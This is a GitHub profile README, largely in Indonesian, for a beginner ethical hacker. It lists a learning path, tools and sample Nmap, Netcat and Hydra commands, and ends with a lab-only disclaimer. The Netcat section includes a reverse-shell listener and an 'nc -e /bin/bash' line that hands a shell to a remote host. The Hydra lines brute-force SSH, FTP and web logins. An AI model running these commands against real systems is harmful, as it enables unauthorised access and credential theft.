<!-- Header Banner -->
<div align="center">

```
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
```

[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&pause=1000&color=00FF41&center=true&vCenter=true&width=600&lines=Aspiring+Ethical+Hacker+%F0%9F%94%90;Cybersecurity+Enthusiast+%F0%9F%9B%A1%EF%B8%8F;Still+Learning+%E2%80%94+One+Scan+at+a+Time+%F0%9F%93%A1;Break+Things+Ethically+%F0%9F%A7%AA)](https://git.io/typing-svg)



</div>

---

## `> whoami`

```bash
$ whoami
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   Name     : Muhamad Nur Afni Alief                         │
│   Role     : Beginner Ethical Hacker🔰                      │
│   Mission  : Get a lot of money                             │     
│   Location : Ursus                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

<br/>

Halo! Saya seorang pemula yang sedang mendalami dunia  **Cybersecurity**. Masih banyak kegagalan yang harus dicoba dan kemenangan yang harus diraih.

> *"The quieter you become, the more you are able to hear."* — Kali Linux

---

## `> current_path --learning`

```
[LEARNING PATH]

 ✅  Dasar-dasar Jaringan (TCP/IP, DNS, HTTP)
 ✅  Linux Command Line
 ✅  Reconnaissance & Information Gathering
 ✅  Network Scanning (Nmap, Wireshark)
 ✅ Vulnerability Assessment 
 ✅ Web Application Pentesting
 ✅Privilege Escalation
 ⏳  CTF Challenges
```

---

## `> tools --list`

> 🧰 Ini adalah senjata saya saat ini — masih dalam tahap berlatih!

<br/>

<div align="center">

### 🔍 Reconnaissance & Scanning

| Tool | Badge | Deskripsi |
|------|-------|-----------|
| **Nmap** | ![Nmap](https://img.shields.io/badge/Nmap-Network%20Scanner-blue?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bTAgMThjLTQuNDIgMC04LTMuNTgtOC04czMuNTgtOCA4LTggOCAzLjU4IDggOC0zLjU4IDgtOCA4eiIvPjwvc3ZnPg==&logoColor=white&labelColor=0d1117) | Network discovery & port scanning |
| **Netcat** | ![Netcat](https://img.shields.io/badge/Netcat-Swiss%20Army%20Knife-orange?style=for-the-badge&logoColor=white&labelColor=0d1117) | TCP/UDP connections & port listening |

<br/>

### 🔓 Password & Brute Force

| Tool | Badge | Deskripsi |
|------|-------|-----------|
| **Hydra** | ![Hydra](https://img.shields.io/badge/Hydra-Password%20Cracker-red?style=for-the-badge&logoColor=white&labelColor=0d1117) | Network login brute-force |
| **Brute Force** | ![Bruteforce](https://img.shields.io/badge/BruteForce-Attack%20Method-critical?style=for-the-badge&logoColor=white&labelColor=0d1117) | Metodologi password guessing |

</div>

<br/>

### Detail Alat yang Sedang Dipelajari:

<details>
<summary>🔍 <b>Nmap — Network Mapper</b></summary>

<br/>

```bash
# Perintah dasar yang sedang saya pelajari:
$ nmap -sV 192.168.1.1          # Service version detection
$ nmap -sC -sV -oN output.txt   # Default scripts + save output
$ nmap -p- 192.168.1.1          # Scan all 65535 ports
$ nmap -A target.com            # Aggressive scan (OS detect, etc.)
```

🧠 **Status Belajar:** Masih memahami output dan flag-flag dasarnya

</details>

<details>
<summary>🔌 <b>Netcat — The Swiss Army Knife</b></summary>

<br/>

```bash
# Perintah yang sedang saya eksplor:
$ nc -lvnp 4444                 # Listen mode (reverse shell)
$ nc 192.168.1.1 80             # Connect ke target port
$ nc -zv 192.168.1.1 20-80     # Port scanning sederhana
$ nc -e /bin/bash target 4444  # Bind shell (lab only!)
```

🧠 **Status Belajar:** Berlatih di environment lokal / lab

</details>

<details>
<summary>💧 <b>Hydra — Login Brute Forcer</b></summary>

<br/>

```bash
# Sintaks yang sedang dipelajari:
$ hydra -l admin -P wordlist.txt ssh://192.168.1.1
$ hydra -L users.txt -P pass.txt ftp://target
$ hydra -l user -P rockyou.txt target http-post-form "..."
```

🧠 **Status Belajar:** Hanya dipraktikkan pada mesin virtual sendiri & lab legal

</details>

<details>
<summary>🔨 <b>Brute Force — Metodologi</b></summary>

<br/>

```
Teknik yang dipelajari:
├── Dictionary Attack   → menggunakan wordlist (rockyou.txt, etc.)
├── Credential Stuffing → kombinasi username:password bocor
├── Mask Attack         → pola password yang diketahui
└── Hybrid Attack       → kombinasi dictionary + rules
```

🧠 **Status Belajar:** Memahami konsep, belum mahir eksekusi

</details>

---

## `> tech_stack --other`

<div align="center">

![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Kali](https://img.shields.io/badge/Kali_Linux-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white)
![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=for-the-badge&logo=burpsuite&logoColor=white)

</div>

---

## `> platforms --training`

> 🏋️ Tempat saya berlatih dan belajar legal:

<div align="center">

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Newbie-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![HackTheBox](https://img.shields.io/badge/HackTheBox-Noob%20Mode-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)](https://hackthebox.com)
</div>

---

## `> github --stats`

<div align="center">

![GitHub Stats](https://github-readme-stats.vercel.app/api?username=yourusername&show_icons=true&theme=chartreuse-dark&hide_border=true&bg_color=0d1117&title_color=00ff41&icon_color=00ff41&text_color=ffffff)

![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=yourusername&layout=compact&theme=chartreuse-dark&hide_border=true&bg_color=0d1117&title_color=00ff41&text_color=ffffff)

</div>

---

## `> ethics --disclaimer` ⚠️

```
╔══════════════════════════════════════════════════════════════╗
║                    ⚠️  DISCLAIMER ⚠️                         ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Semua teknik dan alat yang saya pelajari HANYA digunakan    ║
║  pada:                                                       ║
║    ✅ Mesin virtual milik sendiri                            ║
║    ✅ Lab yang disediakan (TryHackMe, VirtualBox Machine)    ║
║    ✅ Sistem dengan IZIN EKSPLISIT pemiliknya (Metasploit 2) ║
║                                                              ║
║  Ethical Hacking = Hack dengan izin, untuk kebaikan.         ║
║  Unauthorized access adalah ILEGAL. 🚫                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

---

## `> connect --with-me`

<div align="center">

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/yourusername)
[![Instagram](https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://instagram.com/yourusername)
[![GitHub](https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/yourusername)

</div>

---

<div align="center">

```
┌─────────────────────────────────────────────────────┐
│                                                     │
│   "!Freedom is the right of all nations!" 🗺️        │
│                                                     │
│            — Myself                                 │
│                                                     │
└─────────────────────────────────────────────────────┘
```

![Snake animation](https://raw.githubusercontent.com/platane/snk/output/github-contribution-grid-snake-dark.svg)

⚡ *Updated automatically | Still learning, still growing* ⚡

</div>
